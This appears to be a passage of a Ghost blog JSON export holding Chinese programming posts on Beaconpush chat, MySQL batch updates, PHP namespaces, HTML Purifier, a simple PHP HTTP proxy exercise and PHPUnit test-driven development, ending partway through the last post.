{"db":[{"meta":{"exported_on":1577503455806,"version":"2.23.2"},"data":{"migrations_lock":[{"lock_key":"km01","locked":0,"acquired_at":"2019-06-07 06:37:30","released_at":"2019-06-07 06:37:35"}],"migrations":[{"id":1,"name":"1-create-tables.js","version":"init","currentVersion":"2.23"},{"id":2,"name":"2-create-fixtures.js","version":"init","currentVersion":"2.23"},{"id":3,"name":"1-post-excerpt.js","version":"1.3","currentVersion":"2.23"},{"id":4,"name":"1-codeinjection-post.js","version":"1.4","currentVersion":"2.23"},{"id":5,"name":"1-og-twitter-post.js","version":"1.5","currentVersion":"2.23"},{"id":6,"name":"1-add-backup-client.js","version":"1.7","currentVersion":"2.23"},{"id":7,"name":"1-add-permissions-redirect.js","version":"1.9","currentVersion":"2.23"},{"id":8,"name":"1-custom-template-post.js","version":"1.13","currentVersion":"2.23"},{"id":9,"name":"2-theme-permissions.js","version":"1.13","currentVersion":"2.23"},{"id":10,"name":"1-add-webhooks-table.js","version":"1.18","currentVersion":"2.23"},{"id":11,"name":"1-webhook-permissions.js","version":"1.19","currentVersion":"2.23"},{"id":12,"name":"1-remove-settings-keys.js","version":"1.20","currentVersion":"2.23"},{"id":13,"name":"1-add-contributor-role.js","version":"1.21","currentVersion":"2.23"},{"id":14,"name":"1-multiple-authors-DDL.js","version":"1.22","currentVersion":"2.23"},{"id":15,"name":"1-multiple-authors-DML.js","version":"1.22","currentVersion":"2.23"},{"id":16,"name":"1-update-koenig-beta-html.js","version":"1.25","currentVersion":"2.23"},{"id":17,"name":"2-demo-post.js","version":"1.25","currentVersion":"2.23"},{"id":18,"name":"1-rename-amp-column.js","version":"2.0","currentVersion":"2.23"},{"id":19,"name":"2-update-posts.js","version":"2.0","currentVersion":"2.23"},{"id":20,"name":"3-remove-koenig-labs.js","version":"2.0","currentVersion":"2.23"},{"id":21,"name":"4-permalink-setting.js","version":"2.0","currentVersion":"2.23"},{"id":22,"name":"5-remove-demo-post.js","version":"2.0","currentVersion":"2.23"},{"id":23,"name":"6-replace-fixture-posts.js","version":"2.0","currentVersion":"2.23"},{"id":24,"name":"1-add-sessions-table.js","version":"2.2","currentVersion":"2.23"},{"id":25,"name":"2-add-integrations-and-api-key-tables.js","version":"2.2","currentVersion":"2.23"},{"id":26,"name":"3-insert-admin-integration-role.js","version":"2.2","currentVersion":"2.23"},{"id":27,"name":"4-insert-integration-and-api-key-permissions.js","version":"2.2","currentVersion":"2.23"},{"id":28,"name":"5-add-mobiledoc-revisions-table.js","version":"2.2","currentVersion":"2.23"},{"id":29,"name":"1-add-webhook-columns.js","version":"2.3","currentVersion":"2.23"},{"id":30,"name":"2-add-webhook-edit-permission.js","version":"2.3","currentVersion":"2.23"},{"id":31,"name":"1-add-webhook-permission-roles.js","version":"2.6","currentVersion":"2.23"},{"id":32,"name":"1-add-members-table.js","version":"2.8","currentVersion":"2.23"},{"id":33,"name":"1-remove-empty-strings.js","version":"2.13","currentVersion":"2.23"},{"id":34,"name":"1-add-actions-table.js","version":"2.14","currentVersion":"2.23"},{"id":35,"name":"2-add-actions-permissions.js","version":"2.14","currentVersion":"2.23"},{"id":36,"name":"1-add-type-column-to-integrations.js","version":"2.15","currentVersion":"2.23"},{"id":37,"name":"2-insert-zapier-integration.js","version":"2.15","currentVersion":"2.23"},{"id":38,"name":"1-add-members-perrmissions.js","version":"2.16","currentVersion":"2.23"},{"id":39,"name":"1-normalize-settings.js","version":"2.17","currentVersion":"2.23"},{"id":40,"name":"2-posts-add-canonical-url.js","version":"2.17","currentVersion":"2.23"},{"id":41,"name":"1-restore-settings-from-backup.js","version":"2.18","currentVersion":"2.23"},{"id":42,"name":"1-update-editor-permissions.js","version":"2.21","currentVersion":"2.23"},{"id":43,"name":"1-add-member-permissions-to-roles.js","version":"2.22","currentVersion":"2.23"}],"posts":[{"id":"5cfa089b31767300013e0e56","uuid":"5018ddc4-ba12-4db3-b855-f9bcd5dcf5fa","title":"基于Beaconpush的实时聊天功能","slug":"ji-yu-beaconpushde-shi-shi-liao-tian-gong-neng","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\t以前开发叶儿芽的时候尝试过使用php+nodejs搭建一个在线的实时聊天工具，但由于当时团队技术水平有限，效果并不是很好.最后决定采用第三方的聊天服务器来实现这一功能。\\n    \\nBeaconpush是一个优秀的第三方聊天服务器，用户通过WebSocket(或FlashSocket)与Beanconpush服务器保持,连并监听发送给当前用户的消息，实现实时聊天.\\n![Beaconpush](/content/images/2013/Dec/7E9F514A3BE7A1AF690E0BD49B37A043_B500_900_500_181_PNG.png)\\n\\nBeaconpush提供了强大的API，除发送消息外，还有获取在线用户列表等功能,并且提供PHP,Python等多种语言的开发包程序.\\n\\n客户端监听代码：\\n\\n\\t<script type=\\\"text/javascript\\\">\\n\\t\\tBeacon.connect('b58ae219', ['frontpage', 'chat'], {log: true，user:Tom});\\n\\t\\tBeacon.listen(function (message) { alert(message); });\\n    </script>\\n\\n有一点美中不足的是，用户离开聊天页面后，beaconpush服务器无法立刻检测到用户断开连接，会有大约一分多钟的延迟。另外,官方提供的PHP开发包请求Beaconpush服务器有时会很慢,建议自行修改为使用fsocketopen等方式发送请求.\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><pre><code>以前开发叶儿芽的时候尝试过使用php+nodejs搭建一个在线的实时聊天工具，但由于当时团队技术水平有限，效果并不是很好.最后决定采用第三方的聊天服务器来实现这一功能。\n</code></pre>\n<p>Beaconpush是一个优秀的第三方聊天服务器，用户通过WebSocket(或FlashSocket)与Beanconpush服务器保持,连并监听发送给当前用户的消息，实现实时聊天.<br>\n<img src=\"/content/images/2013/Dec/7E9F514A3BE7A1AF690E0BD49B37A043_B500_900_500_181_PNG.png\" alt=\"Beaconpush\"></p>\n<p>Beaconpush提供了强大的API，除发送消息外，还有获取在线用户列表等功能,并且提供PHP,Python等多种语言的开发包程序.</p>\n<p>客户端监听代码：</p>\n<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;\n\tBeacon.connect('b58ae219', ['frontpage', 'chat'], {log: true，user:Tom});\n\tBeacon.listen(function (message) { alert(message); });\n&lt;/script&gt;\n</code></pre>\n<p>有一点美中不足的是，用户离开聊天页面后，beaconpush服务器无法立刻检测到用户断开连接，会有大约一分多钟的延迟。另外,官方提供的PHP开发包请求Beaconpush服务器有时会很慢,建议自行修改为使用fsocketopen等方式发送请求.</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"2","plaintext":"以前开发叶儿芽的时候尝试过使用php+nodejs搭建一个在线的实时聊天工具，但由于当时团队技术水平有限，效果并不是很好.最后决定采用第三方的聊天服务器来实现这一功能。\n\n\nBeaconpush是一个优秀的第三方聊天服务器，用户通过WebSocket(或FlashSocket)与Beanconpush服务器保持,连并监听发送给当前用户的消息，实现实时聊天.\n\n\nBeaconpush提供了强大的API，除发送消息外，还有获取在线用户列表等功能,并且提供PHP,Python等多种语言的开发包程序.\n\n客户端监听代码：\n\n<script type=\"text/javascript\">\n\tBeacon.connect('b58ae219', ['frontpage', 'chat'], {log: true，user:Tom});\n\tBeacon.listen(function (message) { alert(message); });\n</script>\n\n\n有一点美中不足的是，用户离开聊天页面后，beaconpush服务器无法立刻检测到用户断开连接，会有大约一分多钟的延迟。另外,官方提供的PHP开发包请求Beaconpush服务器有时会很慢,建议自行修改为使用fsocketopen等方式发送请求.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 02:27:37","updated_at":"2015-04-04 02:09:38","published_at":"2012-10-06 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e57","uuid":"e2c5d0e9-522d-4d36-90e8-bbb50e3d81d7","title":"mysql批量更新数据为不同的值","slug":"mysqlpi-liang-geng-xin-shu-ju-wei-bu-tong-de-zhi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\t当多条数据需要根据条件分别更新为不同值的时候，应该如何完成？\\n当数据都要被更新为相同的值时，mysql可以很简单的实现，如：\\n<pre>\\nUPDATE user SET name = 'Tom' WHERE user_id = '100';\\n</pre>\\n而当多条数据都需要更新且更新的数据不同时，如果直接采用循环的方法，虽然可以达到目的，但是当数据量比较大时，大量的mysql操作会使性能变得很差，并且造成阻塞。\\n\\nGoogle了一下，找到了可行的解决办法，当需要把多条数据分别更新为不同的值时，可以采用 UPDATE SET WHEN THEN 的语法，例如：\\n<pre>\\nUPDATE user_info SET\\n  `username` =  case user_id WHEN 100 THEN 'Tom' WHEN 101 THEN 'Sue' END ,\\n  `age` =  case user_id WHEN 100 THEN '18' WHEN 101 THEN '20' END\\nWHERE user_id in (100，101)\\n</pre>\\n这样就可以在不影响性能的前提下，一次性把多条数据更新为不同的值。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><pre><code>当多条数据需要根据条件分别更新为不同值的时候，应该如何完成？\n</code></pre>\n<p>当数据都要被更新为相同的值时，mysql可以很简单的实现，如：</p>\n<pre>\nUPDATE user SET name = 'Tom' WHERE user_id = '100';\n</pre>\n<p>而当多条数据都需要更新且更新的数据不同时，如果直接采用循环的方法，虽然可以达到目的，但是当数据量比较大时，大量的mysql操作会使性能变得很差，并且造成阻塞。</p>\n<p>Google了一下，找到了可行的解决办法，当需要把多条数据分别更新为不同的值时，可以采用 UPDATE SET WHEN THEN 的语法，例如：</p>\n<pre>\nUPDATE user_info SET\n  `username` =  case user_id WHEN 100 THEN 'Tom' WHEN 101 THEN 'Sue' END ,\n  `age` =  case user_id WHEN 100 THEN '18' WHEN 101 THEN '20' END\nWHERE user_id in (100，101)\n</pre>\n<p>这样就可以在不影响性能的前提下，一次性把多条数据更新为不同的值。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"4","plaintext":"当多条数据需要根据条件分别更新为不同值的时候，应该如何完成？\n\n\n当数据都要被更新为相同的值时，mysql可以很简单的实现，如：\n\n\nUPDATE user SET name = 'Tom' WHERE user_id = '100';\n\n\n而当多条数据都需要更新且更新的数据不同时，如果直接采用循环的方法，虽然可以达到目的，但是当数据量比较大时，大量的mysql操作会使性能变得很差，并且造成阻塞。\n\nGoogle了一下，找到了可行的解决办法，当需要把多条数据分别更新为不同的值时，可以采用 UPDATE SET WHEN THEN 的语法，例如：\n\n\nUPDATE user_info SET\n  `username` =  case user_id WHEN 100 THEN 'Tom' WHEN 101 THEN 'Sue' END ,\n  `age` =  case user_id WHEN 100 THEN '18' WHEN 101 THEN '20' END\nWHERE user_id in (100，101)\n\n\n这样就可以在不影响性能的前提下，一次性把多条数据更新为不同的值。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 02:32:36","updated_at":"2016-02-12 07:28:12","published_at":"2012-10-15 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e58","uuid":"ed9f6d71-fe2a-4101-91ab-2aba43c03f77","title":"PHP命名空间","slug":"phpming-ming-kong-jian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"命名空间是一种封装事物的方法，用以避免用户编写的代码与 PHP内部的类/函数/常量或第三方类/函数/常量 之间的名字冲突。\\n\\n在PHP支持命名空间之前，为了避免冲突，程序员只能为函数加上一些前缀作为标示，这样不仅写起来麻烦，也降低了代码的可读性。命名空间为此类问题提供一个不错的解决方案，使用命名空间使开发者不必再为函数取一些长而难看的名字。\\n\\n\\t<?php\\n      namespace my\\\\name; \\n      class MyClass {\\n        //code\\n      }\\n      new \\\\my\\\\name\\\\MyClass(); // 也可以直接 new MyClass()\\n\\t?>\\n    \\n* 注意 ， namespace 之前除declare ，不能有任何代码 （包括html代码）。\\n\\n可以使用use关键字导入命名空间中的类并设置别名。如，\\n    \\n    <?php\\n    \\tnamespace foo;                     \\n    \\trequire 'another.php';\\n    \\tuse My\\\\Full\\\\Classname as Another; \\n                                \\n    \\t$another = new Another();\\n    \\t$another->sayHi();\\n\\t?>\\n    \\nPHP 在 5.3.0 以后的版本开始支持命名空间。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>命名空间是一种封装事物的方法，用以避免用户编写的代码与 PHP内部的类/函数/常量或第三方类/函数/常量 之间的名字冲突。</p>\n<p>在PHP支持命名空间之前，为了避免冲突，程序员只能为函数加上一些前缀作为标示，这样不仅写起来麻烦，也降低了代码的可读性。命名空间为此类问题提供一个不错的解决方案，使用命名空间使开发者不必再为函数取一些长而难看的名字。</p>\n<pre><code>&lt;?php\n  namespace my\\name; \n  class MyClass {\n    //code\n  }\n  new \\my\\name\\MyClass(); // 也可以直接 new MyClass()\n?&gt;\n</code></pre>\n<ul>\n<li>注意 ， namespace 之前除declare ，不能有任何代码 （包括html代码）。</li>\n</ul>\n<p>可以使用use关键字导入命名空间中的类并设置别名。如，</p>\n<pre><code>&lt;?php\n\tnamespace foo;                     \n\trequire 'another.php';\n\tuse My\\Full\\Classname as Another; \n                            \n\t$another = new Another();\n\t$another-&gt;sayHi();\n?&gt;\n</code></pre>\n<p>PHP 在 5.3.0 以后的版本开始支持命名空间。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"5","plaintext":"命名空间是一种封装事物的方法，用以避免用户编写的代码与 PHP内部的类/函数/常量或第三方类/函数/常量 之间的名字冲突。\n\n在PHP支持命名空间之前，为了避免冲突，程序员只能为函数加上一些前缀作为标示，这样不仅写起来麻烦，也降低了代码的可读性。命名空间为此类问题提供一个不错的解决方案，使用命名空间使开发者不必再为函数取一些长而难看的名字。\n\n<?php\n  namespace my\\name; \n  class MyClass {\n    //code\n  }\n  new \\my\\name\\MyClass(); // 也可以直接 new MyClass()\n?>\n\n\n * 注意 ， namespace 之前除declare ，不能有任何代码 （包括html代码）。\n\n可以使用use关键字导入命名空间中的类并设置别名。如，\n\n<?php\n\tnamespace foo;                     \n\trequire 'another.php';\n\tuse My\\Full\\Classname as Another; \n                            \n\t$another = new Another();\n\t$another->sayHi();\n?>\n\n\nPHP 在 5.3.0 以后的版本开始支持命名空间。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 02:39:22","updated_at":"2015-04-04 02:10:45","published_at":"2012-11-01 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e59","uuid":"58cdb96d-671c-4feb-bc07-0226c49ea6fd","title":"HTML自动补全 HTML Purifier","slug":"htmlzi-dong-bu-quan-html-purifier","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"有的时候输出从其他地方抓取的html内容时，其中的html代码可能存在错误(如标签不闭合等)，HTML Purifier可以方便的修复这些错误。\\n\\n\\t<?php\\n    \\trequire_once '/path/to/htmlpurifier/library/HTMLPurifier.auto.php';\\n                          \\n   \\t\\t$config = HTMLPurifier_Config::createDefault();\\n    \\t$purifier = new HTMLPurifier($config);\\n    \\t$clean_html = $purifier->purify($dirty_html);\\n\\t?>\\n    \\nHTML Purifier 还可以用于防范恶意脚本的攻击（如XSS攻击）。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>有的时候输出从其他地方抓取的html内容时，其中的html代码可能存在错误(如标签不闭合等)，HTML Purifier可以方便的修复这些错误。</p>\n<pre><code>&lt;?php\n\trequire_once '/path/to/htmlpurifier/library/HTMLPurifier.auto.php';\n                      \n\t$config = HTMLPurifier_Config::createDefault();\n\t$purifier = new HTMLPurifier($config);\n\t$clean_html = $purifier-&gt;purify($dirty_html);\n?&gt;\n</code></pre>\n<p>HTML Purifier 还可以用于防范恶意脚本的攻击（如XSS攻击）。</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"6","plaintext":"有的时候输出从其他地方抓取的html内容时，其中的html代码可能存在错误(如标签不闭合等)，HTML Purifier可以方便的修复这些错误。\n\n<?php\n\trequire_once '/path/to/htmlpurifier/library/HTMLPurifier.auto.php';\n                      \n\t$config = HTMLPurifier_Config::createDefault();\n\t$purifier = new HTMLPurifier($config);\n\t$clean_html = $purifier->purify($dirty_html);\n?>\n\n\nHTML Purifier 还可以用于防范恶意脚本的攻击（如XSS攻击）。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 02:43:20","updated_at":"2015-04-04 02:11:19","published_at":"2012-12-05 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e5a","uuid":"fcd6db56-d07f-42d0-bc17-0b87a8173c94","title":"PHP编写简单HTTP代理程序","slug":"phpbian-xie-jian-dan-httpdai-li-cheng-xu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\t工作室寒假作业:写了一个简单的HTTP代理程序，以加深了对HTTP协议的理解。\\n![http Proxy](/content/images/2013/Dec/5B32D2935451B4EE716CBDE2E654262A_B500_900_500_176_PNG.png)\\n\\n**基本原理:**\\n用户通过浏览器向代理的客户端程序发送请求，客户端把请求组织成数据发送给代理服务器的服务端，服务端根据客户端发来的数据，还原用户的请求，再将数据返回给客户端，最后呈现给用户。\\n\\n配置客户端程序Apache虚拟主机(VirtualHost)监听某一端口，并开启rewrite，将浏览器的所有请求都重定向到客户端程序的入口。\\n\\n\\tRewriteEngine on                                                       \\n\\tRewriteRule ^(.*)$ index.php\\n    \\n客户端从$_SERVER中获取用户请求的header信息，并组织数据发送给服务端程序。\\n\\n\\t/**\\n \\t* 把请求发送到代理服务器\\n \\t*/\\n\\tfunction run(){                                     \\n    \\t//组织数据\\n    \\t$data = $this->buildData();           \\n    \\t//生成一个 curl 句柄 \\n    \\t$curl = $this->buildCurl($data) ;\\n    \\t//把请求数据发送给服务端\\n    \\t$content = curl_exec($curl);               \\n    \\t//设置header\\n    \\theader (\\\"Content-type: \\\".curl_getinfo($curl, CURLINFO_CONTENT_TYPE).\\\"\\\");\\n    \\t//解密\\n    \\t$content = base64_decode($content);   \\n    \\techo $content;           \\n    \\tcurl_close($curl);  \\n\\t}\\n    \\n发送数据采用的是 PHP的curl，其中有两个比较重要的参数值得注意。\\n\\n\\t//把返回结果存入变量中，而不直接输出\\n\\tcurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\\n\\t//自动重定向页面\\n\\tcurl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);\\n    \\n客户端把请求发给代理服务器，而代理服务器的编码可能与用户所请求网站的编码不同，如果直接返回就可能会出现乱码。所以需要在页面输出前手动将编码设为网页需要的编码，以避免出现编码错误。所以需要设置CURLOPT_RETURNTRANSFER.\\n\\n服务端接受到客户端的数据后需要模拟用户发出请求。代码如下：\\n   \\n\\t/**\\n \\t* 发送http请求 \\n \\t*/\\n\\tfunction request(){\\n                                                              \\n    \\t$url = $_REQUEST['url'];\\n    \\tif( !$url ) return false;\\n        \\n    \\t$header = $_REQUEST['header'] ? $_REQUEST['header'] : array();\\n    \\t//生成一个 curl 句柄 \\n    \\t$curl = $this->buildCurl($url,$header);\\n    \\t$content = curl_exec($curl); \\n    \\t//设置header\\n    \\theader (\\\"Content-type: \\\".curl_getinfo($curl, CURLINFO_CONTENT_TYPE).\\\"\\\");\\n    \\t//简单加密\\n    \\t$content = base64_encode($content);\\n    \\techo $content;                             \\n    \\tcurl_close($curl);    \\n\\t}\\n    \\n请求成功后，服务端将得到的页面返回给客户端，这样一次请求就顺利完成了。使用base64简单加密，主要是为翻墙考虑，而非数据的安全性。\\n最后,测试一下通过代理访问网站的实际效果.\\n![renren by proxy](/content/images/2013/Dec/A76B9B16DA3585A3614A20290873091A_B500_900_500_277_PNG.png)\\n\\n**存在的问题**:\\n\\n* 如果返回的数据header 中 Content-type 一项中只设置了文档类型而没有强制规定编码的话，代理服务器会自动将其设置为utf-8，这样一来，如果网页的编码不是utf-8就又乱码了 ...\\n* 还有就是有的网站无法正常提交post数据，至今还是不明白为什么会这样，怀疑可能和重定向有关。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><pre><code>工作室寒假作业:写了一个简单的HTTP代理程序，以加深了对HTTP协议的理解。\n</code></pre>\n<p><img src=\"/content/images/2013/Dec/5B32D2935451B4EE716CBDE2E654262A_B500_900_500_176_PNG.png\" alt=\"http Proxy\"></p>\n<p><strong>基本原理:</strong><br>\n用户通过浏览器向代理的客户端程序发送请求，客户端把请求组织成数据发送给代理服务器的服务端，服务端根据客户端发来的数据，还原用户的请求，再将数据返回给客户端，最后呈现给用户。</p>\n<p>配置客户端程序Apache虚拟主机(VirtualHost)监听某一端口，并开启rewrite，将浏览器的所有请求都重定向到客户端程序的入口。</p>\n<pre><code>RewriteEngine on                                                       \nRewriteRule ^(.*)$ index.php\n</code></pre>\n<p>客户端从$_SERVER中获取用户请求的header信息，并组织数据发送给服务端程序。</p>\n<pre><code>/**\n* 把请求发送到代理服务器\n*/\nfunction run(){                                     \n\t//组织数据\n\t$data = $this-&gt;buildData();           \n\t//生成一个 curl 句柄 \n\t$curl = $this-&gt;buildCurl($data) ;\n\t//把请求数据发送给服务端\n\t$content = curl_exec($curl);               \n\t//设置header\n\theader (&quot;Content-type: &quot;.curl_getinfo($curl, CURLINFO_CONTENT_TYPE).&quot;&quot;);\n\t//解密\n\t$content = base64_decode($content);   \n\techo $content;           \n\tcurl_close($curl);  \n}\n</code></pre>\n<p>发送数据采用的是 PHP的curl，其中有两个比较重要的参数值得注意。</p>\n<pre><code>//把返回结果存入变量中，而不直接输出\ncurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\n//自动重定向页面\ncurl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);\n</code></pre>\n<p>客户端把请求发给代理服务器，而代理服务器的编码可能与用户所请求网站的编码不同，如果直接返回就可能会出现乱码。所以需要在页面输出前手动将编码设为网页需要的编码，以避免出现编码错误。所以需要设置CURLOPT_RETURNTRANSFER.</p>\n<p>服务端接受到客户端的数据后需要模拟用户发出请求。代码如下：</p>\n<pre><code>/**\n* 发送http请求 \n*/\nfunction request(){\n                                                          \n\t$url = $_REQUEST['url'];\n\tif( !$url ) return false;\n    \n\t$header = $_REQUEST['header'] ? $_REQUEST['header'] : array();\n\t//生成一个 curl 句柄 \n\t$curl = $this-&gt;buildCurl($url,$header);\n\t$content = curl_exec($curl); \n\t//设置header\n\theader (&quot;Content-type: &quot;.curl_getinfo($curl, CURLINFO_CONTENT_TYPE).&quot;&quot;);\n\t//简单加密\n\t$content = base64_encode($content);\n\techo $content;                             \n\tcurl_close($curl);    \n}\n</code></pre>\n<p>请求成功后，服务端将得到的页面返回给客户端，这样一次请求就顺利完成了。使用base64简单加密，主要是为翻墙考虑，而非数据的安全性。<br>\n最后,测试一下通过代理访问网站的实际效果.<br>\n<img src=\"/content/images/2013/Dec/A76B9B16DA3585A3614A20290873091A_B500_900_500_277_PNG.png\" alt=\"renren by proxy\"></p>\n<p><strong>存在的问题</strong>:</p>\n<ul>\n<li>如果返回的数据header 中 Content-type 一项中只设置了文档类型而没有强制规定编码的话，代理服务器会自动将其设置为utf-8，这样一来，如果网页的编码不是utf-8就又乱码了 ...</li>\n<li>还有就是有的网站无法正常提交post数据，至今还是不明白为什么会这样，怀疑可能和重定向有关。</li>\n</ul>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"7","plaintext":"工作室寒假作业:写了一个简单的HTTP代理程序，以加深了对HTTP协议的理解。\n\n\n\n\n基本原理:\n用户通过浏览器向代理的客户端程序发送请求，客户端把请求组织成数据发送给代理服务器的服务端，服务端根据客户端发来的数据，还原用户的请求，再将数据返回给客户端，最后呈现给用户。\n\n配置客户端程序Apache虚拟主机(VirtualHost)监听某一端口，并开启rewrite，将浏览器的所有请求都重定向到客户端程序的入口。\n\nRewriteEngine on                                                       \nRewriteRule ^(.*)$ index.php\n\n\n客户端从$_SERVER中获取用户请求的header信息，并组织数据发送给服务端程序。\n\n/**\n* 把请求发送到代理服务器\n*/\nfunction run(){                                     \n\t//组织数据\n\t$data = $this->buildData();           \n\t//生成一个 curl 句柄 \n\t$curl = $this->buildCurl($data) ;\n\t//把请求数据发送给服务端\n\t$content = curl_exec($curl);               \n\t//设置header\n\theader (\"Content-type: \".curl_getinfo($curl, CURLINFO_CONTENT_TYPE).\"\");\n\t//解密\n\t$content = base64_decode($content);   \n\techo $content;           \n\tcurl_close($curl);  \n}\n\n\n发送数据采用的是 PHP的curl，其中有两个比较重要的参数值得注意。\n\n//把返回结果存入变量中，而不直接输出\ncurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\n//自动重定向页面\ncurl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);\n\n\n客户端把请求发给代理服务器，而代理服务器的编码可能与用户所请求网站的编码不同，如果直接返回就可能会出现乱码。所以需要在页面输出前手动将编码设为网页需要的编码，以避免出现编码错误。所以需要设置CURLOPT_RETURNTRANSFER.\n\n服务端接受到客户端的数据后需要模拟用户发出请求。代码如下：\n\n/**\n* 发送http请求 \n*/\nfunction request(){\n                                                          \n\t$url = $_REQUEST['url'];\n\tif( !$url ) return false;\n    \n\t$header = $_REQUEST['header'] ? $_REQUEST['header'] : array();\n\t//生成一个 curl 句柄 \n\t$curl = $this->buildCurl($url,$header);\n\t$content = curl_exec($curl); \n\t//设置header\n\theader (\"Content-type: \".curl_getinfo($curl, CURLINFO_CONTENT_TYPE).\"\");\n\t//简单加密\n\t$content = base64_encode($content);\n\techo $content;                             \n\tcurl_close($curl);    \n}\n\n\n请求成功后，服务端将得到的页面返回给客户端，这样一次请求就顺利完成了。使用base64简单加密，主要是为翻墙考虑，而非数据的安全性。\n最后,测试一下通过代理访问网站的实际效果.\n\n\n存在的问题:\n\n * 如果返回的数据header 中 Content-type\n   一项中只设置了文档类型而没有强制规定编码的话，代理服务器会自动将其设置为utf-8，这样一来，如果网页的编码不是utf-8就又乱码了 ...\n * 还有就是有的网站无法正常提交post数据，至今还是不明白为什么会这样，怀疑可能和重定向有关。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 03:10:42","updated_at":"2016-02-12 07:32:31","published_at":"2013-01-11 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e5b","uuid":"0bcc8a9a-2d2a-44cf-b006-85dabf1dcd27","title":"PHP的测试驱动开发","slug":"phpde-ce-shi-qu-dong-kai-fa","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\">Whenever you are tempted to type something into a print statement or a debugger expression, write it as a test instead.                      \\n<span style=\\\"float:right\\\">--Martin Fowler<span>   \\n\\n正确的测试代码可以很大程度的保证生产代码的可靠性，TDD规范要求开发者在编写生产代码之前先为其接口编写测试。这样可以保证在产品需求不变的前提下稳步推进开发进程，避免潜在BUG，同时也不必担心在改代码的过程中影响该代码其他的调用者。有测试代码为你保驾护航那么就请大胆的重构吧，TDD保证你的代码整天干爽。从此，我们终于告别坑爹的队员，告别客户的夺命连环call，程序员们可以睡个好觉了。所以还有什么理由向这样可爱的开发方式说不呢，现在就开始吧。\\n\\nPHP最知名的测试框架PHPUnit完整的复制了JUnit3的实现方式,如果你了解JUnit,那基本可以直接上手了.\\n![PHPUnit](/content/images/2013/Dec/2ED747AB92F610AC407F10B6D0AB0BCB_B500_900_500_133_PNG.png)\\n\\n代码顺利通过测试了，不过当测试代码越来越多以后，要挨个执行测试还是比较麻烦的，别担心，phpunit提供了测试套件帮助你完美解决这个问题。以下是一个简单测试套件的例子：\\n\\n\\t/**                  \\n \\t* 我的测试套件\\n \\t*/\\n\\tclass suite extends PHPUnit2_Framework_TestSuite {\\n                           \\n    \\tpublic function __construct(){\\n     \\t   $testFiles = array(\\n      \\t      'IndexTest.php', //首页\\n      \\t      'UserTest.php', //用户管理\\n      \\t   );  \\n       \\t   $this->addTestFiles( $testFiles );\\n    \\t}   \\n                           \\n    \\tpublic static function suite() {\\n     \\t   //最后一定得返回PHPUnit_Framework_TestSuite对像\\n      \\t  return new self();\\n    \\t}   \\n\\t}\\n    